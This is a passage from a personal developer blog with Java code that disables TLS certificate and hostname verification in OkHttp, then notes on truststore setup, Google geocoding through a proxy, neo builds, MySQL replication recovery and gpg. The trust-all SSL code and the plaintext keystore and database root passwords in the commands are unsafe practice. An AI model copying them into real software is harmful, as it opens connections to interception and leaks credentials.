                  @Override</span><br><span class="line">                        public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType)</span><br><span class="line">                                throws CertificateException &#123;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        @Override</span><br><span class="line">                        public java.security.cert.X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">                            return new java.security.cert.X509Certificate[]&#123;&#125;;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            // Install the all-trusting trust manager</span><br><span class="line">            final SSLContext sslContext = SSLContext.getInstance(&quot;SSL&quot;);</span><br><span class="line">            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());</span><br><span class="line">            // Create an ssl socket factory with our all-trusting manager</span><br><span class="line">            final SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();</span><br><span class="line"></span><br><span class="line">            builder.sslSocketFactory(sslSocketFactory, (X509TrustManager)trustAllCerts[0]);</span><br><span class="line">            builder.hostnameVerifier(new HostnameVerifier() &#123;</span><br><span class="line">                @Override</span><br><span class="line">                public boolean verify(String hostname, SSLSession session) &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            LOGGER.warn(&quot;Exception while configuring IgnoreSslCertificate&quot; + e, e);</span><br><span class="line">        &#125;</span><br><span class="line">        return builder;</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure>

<h3 id="2-Add-the-ssl-certificate-to-trust-store-xx-egis-jks"><a href="#2-Add-the-ssl-certificate-to-trust-store-xx-egis-jks" class="headerlink" title="2. Add the ssl certificate to trust store (xx_egis.jks)"></a>2. Add the ssl certificate to trust store (xx_egis.jks)</h3><h4 id="Run-following-command"><a href="#Run-following-command" class="headerlink" title="Run following command:"></a>Run following command:</h4><p><code>openssl s_client -connect maps.googleapis.com:443 -showcerts</code></p>
<h4 id="Save-the-certificate-within-—–BEGIN-CERTIFICATE—–-…-—–END-CERTIFICATE—–-as-file-google-maps-api-crt-reminder-save-the-root-ca-certificate-not-the-website-certificate"><a href="#Save-the-certificate-within-—–BEGIN-CERTIFICATE—–-…-—–END-CERTIFICATE—–-as-file-google-maps-api-crt-reminder-save-the-root-ca-certificate-not-the-website-certificate" class="headerlink" title="Save the certificate (within —–BEGIN CERTIFICATE—– … —–END CERTIFICATE—–) as file google.maps.api.crt (reminder: save the root ca certificate, not the website certificate)"></a>Save the certificate (within —–BEGIN CERTIFICATE—– … —–END CERTIFICATE—–) as file <em>google.maps.api.crt</em> (reminder: save the root ca certificate, not the website certificate)</h4><h4 id="Import-the-certificate-to-trust-store"><a href="#Import-the-certificate-to-trust-store" class="headerlink" title="Import the certificate to trust store"></a>Import the certificate to trust store</h4><p><code>keytool -import -trustcacerts -v -alias maps.googleapis.com -file google.maps.api.crt -keystore xx_egis.jks -storepass dxc.xx@2017</code></p>
<h4 id="List-the-latest-certificates-in-trust-store-it-should-contain-following-entries"><a href="#List-the-latest-certificates-in-trust-store-it-should-contain-following-entries" class="headerlink" title="List the latest certificates in trust store, it should contain following entries,"></a>List the latest certificates in trust store, it should contain following entries,</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -keystore xx_egis.jks -storepass dxc.xx@2017</span><br><span class="line">payment_signing, 2018年2月7日, trustedCertEntry,</span><br><span class="line">憑證指紋 (SHA1): 6B:EA:31:51:8D:F8:81:3B:D8:D1:D8:0C:E7:22:12:21:96:E9:59:26</span><br><span class="line">rootca, 2017年8月22日, trustedCertEntry,</span><br><span class="line">憑證指紋 (SHA1): C7:2C:81:6D:EB:2D:C7:36:63:90:D3:68:2D:57:F1:8F:C5:37:AF:DA</span><br><span class="line">friendly3, 2018年1月9日, PrivateKeyEntry,</span><br><span class="line">憑證指紋 (SHA1): CF:42:5A:D1:FB:A1:8F:AA:81:B5:76:F2:39:31:D6:4F:65:88:1A:A1</span><br><span class="line">trust1, 2017年8月22日, trustedCertEntry,</span><br><span class="line">憑證指紋 (SHA1): C4:F1:83:51:20:55:BC:66:2F:D7:BA:F4:D4:7B:C9:43:95:9D:E2:D6</span><br><span class="line">maps.googleapis.com, 2018年7月25日, trustedCertEntry,</span><br><span class="line">憑證指紋 (SHA1): EE:AC:BD:0C:B4:52:81:95:77:91:1E:1E:62:03:DB:26:2F:84:A3:18</span><br></pre></td></tr></table></figure>


<p>My test program to call geocode web service</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">package test;</span><br><span class="line"></span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.net.InetSocketAddress;</span><br><span class="line">import java.net.Proxy;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLConnection;</span><br><span class="line"></span><br><span class="line">import com.google.maps.GeoApiContext;</span><br><span class="line">import com.google.maps.GeocodingApi;</span><br><span class="line">import com.google.maps.errors.ApiException;</span><br><span class="line">import com.google.maps.model.GeocodingResult;</span><br><span class="line">import com.google.maps.model.Geometry;</span><br><span class="line"></span><br><span class="line">import okhttp3.Headers;</span><br><span class="line">import okhttp3.OkHttpClient;</span><br><span class="line">import okhttp3.Request;</span><br><span class="line">import okhttp3.Response;</span><br><span class="line"></span><br><span class="line">public class ConnectionThrProxy &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        //normalCall();</span><br><span class="line">        //okhttpCall();</span><br><span class="line">        mapCall();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void normalCall() throws IOException &#123;</span><br><span class="line">        //System.setProperty(&quot;http.proxyHost&quot;, &quot;proxy1.govcloud.gov.hk&quot;);</span><br><span class="line">        //System.setProperty(&quot;http.proxyPort&quot;, &quot;4005&quot;);</span><br><span class="line"></span><br><span class="line">        URL url = new URL(&quot;http://www.google.com/&quot;);</span><br><span class="line"></span><br><span class="line">        String proxyAddress = &quot;proxy1.govcloud.gov.hk&quot;;</span><br><span class="line">        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyAddress, 4005));</span><br><span class="line"></span><br><span class="line">        URLConnection con = url.openConnection(proxy);</span><br><span class="line"></span><br><span class="line">        BufferedReader in = new BufferedReader(new InputStreamReader(</span><br><span class="line">                con.getInputStream()));</span><br><span class="line"></span><br><span class="line">        // Read it ...</span><br><span class="line">        String inputLine;</span><br><span class="line">        while ((inputLine = in.readLine()) != null)</span><br><span class="line">            System.out.println(inputLine);</span><br><span class="line"></span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void okhttpCall() throws IOException &#123;</span><br><span class="line">        String proxyAddress = &quot;proxy1.govcloud.gov.hk&quot;;</span><br><span class="line">        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyAddress, 4005));</span><br><span class="line"></span><br><span class="line">        OkHttpClient.Builder builder = new OkHttpClient.Builder().proxy(proxy);</span><br><span class="line">        OkHttpClient client = builder.build();</span><br><span class="line"></span><br><span class="line">        Request request = new Request.Builder()</span><br><span class="line">                .url(&quot;https://publicobject.com/helloworld.txt&quot;)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        try (Response response = client.newCall(request).execute()) &#123;</span><br><span class="line">            if (!response.isSuccessful())</span><br><span class="line">                throw new IOException(&quot;Unexpected code &quot; + response);</span><br><span class="line"></span><br><span class="line">            Headers responseHeaders = response.headers();</span><br><span class="line">            for (int i = 0; i &lt; responseHeaders.size(); i++) &#123;</span><br><span class="line">                System.out.println(responseHeaders.name(i) + &quot;: &quot; + responseHeaders.value(i));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(response.body().string());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void mapCall() &#123;</span><br><span class="line">        String googleMapKey = &quot;key-id&quot;;</span><br><span class="line">        String proxyAddress = &quot;proxy1.govcloud.gov.hk&quot;;</span><br><span class="line">        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyAddress, 4005));</span><br><span class="line">        GeoApiContext context = new GeoApiContext.Builder().apiKey(googleMapKey).proxy(proxy).build();</span><br><span class="line"></span><br><span class="line">        GeocodingResult[] results;</span><br><span class="line"></span><br><span class="line">        String address = &quot;16 FLOOR EMPEROR COMMERCIAL CENTRE 39 DES VOEUX ROAD CENTRAL CENTRAL HONG KONG&quot;;</span><br><span class="line">        try &#123;</span><br><span class="line">            results = GeocodingApi.geocode(context, address).await();</span><br><span class="line">            if (results.length &gt; 0) &#123;</span><br><span class="line">                Geometry geometry = results[0].geometry;</span><br><span class="line"></span><br><span class="line">                double lat = geometry.location.lat;</span><br><span class="line">                double lng = geometry.location.lng;</span><br><span class="line">                String locType = geometry.locationType.toString();</span><br><span class="line">                String formattedAddr = results[0].formattedAddress;</span><br><span class="line">                System.out.println(&quot;formattedAddr &quot; + formattedAddr);</span><br><span class="line">                </span><br><span class="line">                System.out.println(&quot;lat &quot; + lat);</span><br><span class="line">                System.out.println(&quot;lng &quot; + lng);</span><br><span class="line">                //printGeoResult(appl.getEngApplName(), results);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                System.out.println(&quot;no geo result returned for address &#123;&#125;&quot; + address);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ApiException | InterruptedException | IOException e) &#123;</span><br><span class="line">            System.out.println(&quot;findGeoLocation&quot; + e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Run-the-program-with-showing-detail-debug-message"><a href="#Run-the-program-with-showing-detail-debug-message" class="headerlink" title="Run the program with showing detail debug message"></a>Run the program with showing detail debug message</h4><p>Folder structure</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ConnectionThrProxy.class</span><br><span class="line"></span><br><span class="line">lib/</span><br><span class="line"> google-maps-services-0.2.8.jar</span><br><span class="line"> gson-2.8.0.jar</span><br><span class="line"> joda-time-2.10.jar</span><br><span class="line"> okhttp-3.8.1.jar</span><br><span class="line"> okio-1.13.0.jar</span><br><span class="line"> slf4j-api-1.7.24.jar</span><br><span class="line"> </span><br><span class="line">java -cp &quot;.;lib/*&quot; -Djavax.net.ssl.trustStore=xx_egis.jks -Djavax.net.debug=ssl test.ConnectionThrProxy</span><br></pre></td></tr></table></figure>

<p>SSL debug parameter for reference<br><code>-Djavax.net.debug=ssl | -Djavax.net.debug=all</code></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Install-neo-project" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2018-05-31T04:54:38.000Z"><a href="/2018/05/31/Install-neo-project/">2018-05-31</a></time>
      
      
  
    <h1 class="title"><a href="/2018/05/31/Install-neo-project/">Install neo project</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Install-dotnet-core"><a href="#Install-dotnet-core" class="headerlink" title="Install dotnet core"></a>Install dotnet core</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download dotnet-sdk-2.1.200-linux-x64.tar.gz</span><br><span class="line">tar zxf dotnet-sdk-2.1.200-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>

<h1 id="Install-cmake"><a href="#Install-cmake" class="headerlink" title="Install cmake"></a>Install cmake</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://cmake.org/files/v3.11/cmake-3.11.2-Linux-x86_64.tar.gz</span><br><span class="line">tar xvf cmake-3.11.2-Linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure>

<p>Config cmake in environment path<br><code>PATH=$PATH:$HOME/.local/bin:$HOME/bin:/home/ec2-user/neo/dotnet-core:/home/ec2-user/neo/leveldb/cmake-3.11.2-Linux-x86_64/bin</code></p>
<h1 id="Install-snappy"><a href="#Install-snappy" class="headerlink" title="Install snappy"></a>Install snappy</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/google/snappy</span><br><span class="line">cd snappy/</span><br></pre></td></tr></table></figure>
<p>we need to build a <strong>share object</strong> of snappy lib, change file CMakeLists.txt as below</p>
<p><code>option(BUILD_SHARED_LIBS &quot;Build shared libraries(DLLs).&quot; OFF)</code><br>&#x3D;&gt;<br><code>option(BUILD_SHARED_LIBS &quot;Build shared libraries(DLLs).&quot; ON)</code></p>
<p>Run commands below to install snappy share object </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir build </span><br><span class="line">cd build </span><br><span class="line">cmake ../</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h1 id="neo-leveldb-not-google-obsolated"><a href="#neo-leveldb-not-google-obsolated" class="headerlink" title="neo-leveldb (not google) (obsolated)"></a>neo-leveldb (not google) (obsolated)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/neo-project/leveldb</span><br><span class="line">make</span><br><span class="line">cd out-shared/</span><br><span class="line">sudo cp libleveldb.so.1.19 /usr/local/lib64/</span><br><span class="line">cd /usr/local/lib64/</span><br><span class="line">sudo ln -s libleveldb.so.1.19 libleveldb.so.1</span><br><span class="line">sudo ln -s libleveldb.so.1 libleveldb.so</span><br><span class="line">sudo ldconfig -v</span><br></pre></td></tr></table></figure>

<h1 id="leveldb-google"><a href="#leveldb-google" class="headerlink" title="leveldb (google)"></a>leveldb (google)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/google/leveldb/archive/master.zip</span><br><span class="line">unzip master.zip</span><br><span class="line">cd leveldb-master/</span><br><span class="line">mkdir -p build &amp;&amp; cd build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Release -DBUILD_SHARED_LIBS=on .. &amp;&amp; cmake --build .</span><br><span class="line">sudo cp -p libleveldb.so /usr/local/lib64/</span><br><span class="line">sudo ldconfig -v</span><br></pre></td></tr></table></figure>

<h1 id="neo-cli"><a href="#neo-cli" class="headerlink" title="neo-cli"></a>neo-cli</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/neo-project/neo-cli</span><br><span class="line">cd neo-cli</span><br><span class="line">dotnet publish -c Release</span><br><span class="line">dotnet /home/ec2-user/neo/neo-cli/neo-cli/bin/Release/netcoreapp2.0/publish/neo-cli.dll .</span><br><span class="line">  &gt;&gt; show state </span><br><span class="line">  &gt;&gt; create wallet wallet.db3</span><br></pre></td></tr></table></figure>

<h1 id="neo-compile"><a href="#neo-compile" class="headerlink" title="neo-compile"></a>neo-compile</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/neo-project/neo-compiler</span><br><span class="line">dotnet publish -c Release</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-recover-replication-on-mysql" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2018-02-28T04:07:07.000Z"><a href="/2018/02/28/recover-replication-on-mysql/">2018-02-28</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/28/recover-replication-on-mysql/">recover-replication-on-mysql</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li><p>Stop data sync on slave node</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pcR@2017 xxx_prd</span><br><span class="line">&gt; show slave status \G;</span><br><span class="line">&gt; stop slave;</span><br></pre></td></tr></table></figure>
</li>
<li><p>export data from master node</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -pcR@2017 -c tcspls_prd --no-data any_table1, any_table2 &gt; xxx_prd_schema-only-Dump20180228.sql</span><br><span class="line"></span><br><span class="line">mysqldump -uroot -pcR@2017 -c tcspls_prd | sed &#x27;s/ AUTO_INCREMENT=[0-9]*//g&#x27; &gt; xxx_prd_dmp_20190524.sql(export all data)</span><br></pre></td></tr></table></figure>
</li>
<li><p>Using Search and Replace to remove *auto_increment&#x3D;<em>DE</em> to <em>DE</em> directive since the exported schema sql included auto_increment value (no need as use <em>sed</em> to filter auto increment)</p>
</li>
<li><p>Show status on master node</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SHOW MASTER STATUS\G;</span><br><span class="line">show master logs;\G</span><br><span class="line">show binlog events\G;</span><br><span class="line">show variables like &#x27;log_%&#x27;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>create replication user if neccessary</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; CREATE USER replication@slave_node;</span><br><span class="line">&gt; GRANT REPLICATION SLAVE ON *.* TO replication@slave_node IDENTIFIED BY &#x27;password&#x27;;</span><br><span class="line">&gt; FLUSH privileges;</span><br><span class="line">&gt; SHOW MASTER STATUS</span><br></pre></td></tr></table></figure>
</li>
<li><p>import data from master node</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pcR@2017 xxx_prd &lt; xxx_prd.sql</span><br></pre></td></tr></table></figure>
</li>
<li><p>start slave to replicate data from binlog.000198</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">change master to</span><br><span class="line">  master_host=&#x27;master_node&#x27;,</span><br><span class="line">  master_port=3306,</span><br><span class="line">  master_user=&#x27;replication&#x27;,</span><br><span class="line">  master_password=&#x27;password&#x27;,</span><br><span class="line">  master_log_file=&#x27;mysql-bin.000198&#x27;,</span><br><span class="line">  master_log_pos=821;</span><br></pre></td></tr></table></figure>
<p>Or just run as below to update master info and relay log info, please check whether relay-log.info is updated and check progress of data replication.<br><code>change master to master_log_file=&#39;mysql-bin.000198&#39;,master_log_pos=821;</code></p>
</li>
</ul>
<p>Then start slave process<br><code>start slave;</code></p>
<ul>
<li><p>lines in ‘show slave status \G;’ should be noticed</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Slave_IO_Running: Yes</span><br><span class="line">Slave_SQL_Running: Yes</span><br></pre></td></tr></table></figure>

</li>
<li><p>for common issue of failure of MySQL replication, use sql_slave_skip_counter to skip error</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stop slave;</span><br><span class="line">set global sql_slave_skip_counter=1;</span><br><span class="line">start slave;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Reference<br><a target="_blank" rel="noopener" href="http://xstarcd.github.io/wiki/MySQL/online_mysqlrepl_error.html">线上MYSQL同步报错故障处理总结</a><br><a target="_blank" rel="noopener" href="https://blog.wu-boy.com/2008/12/mysql-%E5%AF%A6%E5%81%9A-mysql-master-master-replication-%E5%90%8C%E6%AD%A5/">實做 MySQL Master-Master Replication 同步</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/jesseyoung/article/details/41942809">mysql主从复制-CHANGE MASTER TO 语法详解</a><br><a target="_blank" rel="noopener" href="http://blog.51cto.com/suifu/1845457">3分钟解决MySQL 1032 主从错误</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/martinzhang/p/3454358.html">MySQL的binlog日志</a> (great article)<br><a target="_blank" rel="noopener" href="https://www.puritys.me/docs-blog/article-304-Mysql-Replication-%E8%A8%AD%E5%AE%9A.html">Mysql Replication 設定</a><br><a target="_blank" rel="noopener" href="https://www.phpini.com/mysql/mysql-master-slave-replication">MySQL 設定 Master-Slave Replication 同步</a></p>
</li>
</ul>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-gpg" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2017-11-14T08:48:00.000Z"><a href="/2017/11/14/gpg/">2017-11-14</a></time>
      
      
  
    <h1 class="title"><a href="/2017/11/14/gpg/">gpg</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li><p>list public key pubring<br>gpg -k</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pub   4096R/7BB9E54D 2014-03-10</span><br><span class="line">uid                  EGIS PPS UAT (PPS Testing cert) &lt;egis_support@ogcio.gov.hk&gt;</span><br><span class="line">sub   4096R/C35F602F 2014-03-10</span><br><span class="line"></span><br><span class="line">pub   4096R/0490D4D2 2017-11-02 [expires: 2019-11-02]</span><br><span class="line">uid                  Mars Registry (For PPS Recon. File Encryption) &lt;mars@gmail.com&gt;</span><br><span class="line">sub   4096R/B3D05CBB 2017-11-02 [expires: 2019-11-02]</span><br></pre></td></tr></table></figure>
</li>
<li><p>list private key secring<br>gpg -K</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sec   4096R/7BB9E54D 2014-03-10</span><br><span class="line">uid                  EGIS PPS UAT (PPS Testing cert) &lt;egis_support@ogcio.gov.hk&gt;</span><br><span class="line">ssb   4096R/C35F602F 2014-03-10</span><br><span class="line"></span><br><span class="line">sec   4096R/0490D4D2 2017-11-02 [expires: 2019-11-02]</span><br><span class="line">uid                  Mars Registry (For PPS Recon. File Encryption) &lt;mars@gmail.com&gt;</span><br><span class="line">ssb   4096R/B3D05CBB 2017-11-02</span><br></pre></td></tr></table></figure>
</li>
<li><p>export public key<br><code>gpg --export --armor 0490D4D2 &gt; ogcio_pps.pub</code></p>
</li>
<li><p>export private key<br><code>gpg --export-secret-keys --armor 0490D4D2 &gt; ogcio_pps.sec</code></p>
</li>
<li><p>list key details to get the key id<br><code>gpg --export 0490D4D2|gpg --list-packets --verbose</code></p>
</li>
<li><p>get key id from gpg file<br><code>gpg --list-packets &lt;filename&gt;</code></p>
</li>
<li><p>sign file<br><code>gpg --output doc.sig --sign doc (default output is doc.gpg)</code><br><code>gpg --output doc.sig --clearsign doc =&gt; (clear text signature)</code></p>
</li>
<li><p>verify and decrypt<br><code>gpg doc.sig</code></p>
</li>
<li><p>sign detached<br><code>gpg --output doc.sig --detach-sig doc</code></p>
</li>
<li><p>verify<br><code>gpg --verify doc.sig doc</code></p>
</li>
</ul>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-git_config" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2017-07-05T10:55:09.000Z"><a href="/2017/07/05/git_config/">2017-07-05</a></time>
      
      
  
    <h1 class="title"><a href="/2017/07/05/git_config/">git config</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[core]</span><br><span class="line">  repositoryformatversion = 0</span><br><span class="line">  filemode = false</span><br><span class="line">  bare = false</span><br><span class="line">  logallrefupdates = true</span><br><span class="line">  symlinks = false</span><br><span class="line">  ignorecase = true</span><br><span class="line">  hideDotFiles = dotGitOnly</span><br><span class="line">[alias]</span><br><span class="line">  st=status</span><br><span class="line">  